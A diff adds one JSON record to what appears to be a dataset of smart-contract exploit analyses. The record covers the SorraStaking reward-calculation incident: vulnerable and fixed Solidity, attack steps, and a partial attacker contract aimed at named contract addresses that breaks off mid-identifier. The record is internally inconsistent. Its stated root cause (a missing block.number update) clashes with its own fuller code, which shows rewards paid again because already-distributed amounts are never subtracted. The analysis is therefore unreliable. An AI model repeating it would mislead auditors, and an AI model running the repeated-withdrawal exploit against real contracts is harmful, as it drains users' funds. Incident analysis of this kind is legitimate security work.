@@ -1,0 +1,37 @@
+{
+ "id": "2025__2025-01-08_SorraStaking_RewardCalculationFlaw",
+ "source_file": "2025/2025-01-08_SorraStaking_RewardCalculationFlaw.md",
+ "title": "SorraStaking — Staking Reward Calculation Bug Analysis",
+ "date": "2025-01-08",
+ "protocol": "SorraStaking",
+ "chain": "Ethereum",
+ "loss_raw": "~8 ETH",
+ "loss_usd": null,
+ "root_cause": "During staking reward calculation, only the block timestamp was updated while the block number was not, causing accumulated reward errors on repeated withdrawals",
+ "attack_tx": "0x6439...90d",
+ "vulnerable_contract": "0x5d16b8Ba...",
+ "classes": [
+  "staking-reward"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: only timestamp updated, block number missing\nfunction withdraw(uint256 amount) external {\n    UserInfo storage user = userInfo[msg.sender];\n    uint256 reward = calculateReward(user);\n\n    // Timestamp is updated\n    user.lastRewardTime = block.timestamp;\n    //",
+  "❌ block.number update missing → block-number-based calculation becomes incorrect on next call\n    // user.lastRewardBlock = block.number;  ← absent\n\n    user.amount -= amount;\n    sor.transfer(msg.sender, amount + reward);\n}\n\n//",
+  "// State variables relevant to the exploit\nstruct Deposit {\n    uint256 amount;       // remaining token amount in this deposit slot\n    uint256 depositTime;  // timestamp when deposit was made\n    uint8 tier;\n    uint256 rewardBps;    // reward rate in basis points\n}\n\nstruct Position {\n    Deposit[] deposits;\n    uint256 totalAmount;\n}\n\nmapping(address => Position) public positions;\nmapping(address => uint256) public userRewardsDistributed; // tracks paid rewards\n\n// -------------------------------------------------------------------------\n\nfunction withdraw(uint256 _amount) external nonReentrant {\n    require(_amount > 0, \"Amount must be greater than 0\");\n    Position storage position = positions[_msgSender()];\n    require(_amount <= position.totalAmount, \"Insufficient balance\");\n\n    uint256 withdrawableAmount = 0;\n    for (uint256 i = 0; i < position.deposits.length; i++) {\n        Deposit memory dep = position.deposits[i];\n        if (block.timestamp > dep.depositTime + vestingTiers[dep.tier].period) {\n            withdrawableAmount += dep.amount;\n        }\n    }\n    require(withdrawableAmount >= _amount, \"Lock period not finished\");\n\n    uint256 rewardAmount = getPendingRewards(_msgSender()); // ❌ always returns FULL reward\n\n    _updatePosition(_msgSender(), _amount, true, position.deposits[0].tier);\n    // ❌ _decreasePosition subtracts only _amount from dep.amount,\n    //    but does NOT record that the reward was already paid for the remaining balance.\n\n    if (rewardAmount > 0) {\n        userRewardsDistributed[_msgSender()] += rewardAmount;\n        totalRewardsDistributed += rewardAmount;\n        IERC20(rewardToken).safeTransfer(_msgSender(), _amount + rewardAmount);\n        emit RewardDistributed(_msgSender(), rewardAmount);\n    } else {\n        IERC20(rewardToken).safeTransfer(_msgSender(), _amount);\n    }\n}\n\nfunction getPendingRewards(address wallet) public view returns (uint256) {\n    if (positions[wallet].totalAmount == 0) {\n        return 0;\n    }\n    return _calculateRewards(positions[wallet].totalAmount, wallet);\n    // ❌ returns _calculateRewards result; does NOT subtract userRewardsDistributed[wallet]\n}\n\nfunction _calculateRewards(uint256 /* unusedParam */, address wallet) internal view returns (uint256) {\n    Position storage pos = positions[wallet];\n    uint256 length = pos.deposits.length;\n    if (length == 0) return 0;\n\n    uint256 totalRewards = 0;\n    uint256 currentTime = block.timestamp;\n\n    for (uint256 i = 0; i < length; i++) {\n        Deposit storage dep = pos.deposits[i];\n        uint256 timeElapsed = currentTime - dep.depositTime; // ❌ always from original depositTime\n        uint256 vestingTime = vestingTiers[dep.tier].period;\n\n        if (timeElapsed >= vestingTime) {\n            uint256 rewardAmount = (dep.amount * dep.rewardBps) / 10000; // ❌ full reward on remaining amount\n            totalRewards += rewardAmount;\n        }\n    }\n\n    return totalRewards;\n}"
+ ],
+ "code_after": [
+  "✅ Safe code: both timestamp and block number updated\nfunction withdraw(uint256 amount) external {\n    UserInfo storage user = userInfo[msg.sender];\n    uint256 reward = calculateReward(user);\n\n    user.lastRewardTime = block.timestamp;\n    user.lastRewardBlock = block.number;  // ← must be updated\n\n    user.amount -= amount;\n    sor.transfer(msg.sender, amount + reward);\n}",
+  "// ✅ Fix: subtract already-distributed rewards from getPendingRewards\nfunction getPendingRewards(address wallet) public view returns (uint256) {\n    if (positions[wallet].totalAmount == 0) return 0;\n    uint256 gross = _calculateRewards(positions[wallet].totalAmount, wallet);\n    // ✅ never pay more than what has not yet been distributed\n    if (gross <= userRewardsDistributed[wallet]) return 0;\n    return gross - userRewardsDistributed[wallet];\n}"
+ ],
+ "steps": [
+  "→ [1] Deposit ~122 billion SOR tokens (tier 0)",
+  "→ [2] vm.warp(+14 days) — simulate 14-day elapsed time",
+  "→ [3] withdraw(1) × 800 repeated calls",
+  "block number not updated → reward recalculation overpays",
+  "→ [4] Accumulated SOR tokens → swapped to ETH via Uniswap V2",
+  "→ [5] ~8 ETH obtained"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Deposit ~122 billion SOR tokens (tier 0)\n  │\n  ├─→ [2] vm.warp(+14 days) — simulate 14-day elapsed time\n  │\n  ├─→ [3] withdraw(1) × 800 repeated calls\n  │         └─ each call resets only the timestamp\n  │            block number not updated → reward recalculation overpays\n  │\n  ├─→ [4] Accumulated SOR tokens → swapped to ETH via Uniswap V2\n  │\n  └─→ [5] ~8 ETH obtained",
+  "// Full PoC not available — reconstructed from summary\n\ncontract SorraAttacker {\n    address constant SOR = 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF;\n    address constant STAKING = 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50;\n\n    function attack() external {\n        // [1] Deposit large amount of SOR (tier 0)\n        uint256 depositAmount = 122_000_000_000 * 1e18; // 122 billion SOR\n        IERC20(SOR).approve(STAKING, depositAmount);\n        ISorStaking(STAKING).deposit(depositAmount, 0); // tier 0\n\n        // [2] Advance 14 days (using vm.warp)\n        // vm.warp(block.timestamp + 14 days);\n\n        // [3] Withdraw small amount 800 times\n        //     Block number not updated → rewards recalculated on every call\n        for (uint256 i = 0; i < 800; i++) {\n            ISorStaking(STAKI"
+ ]
+}
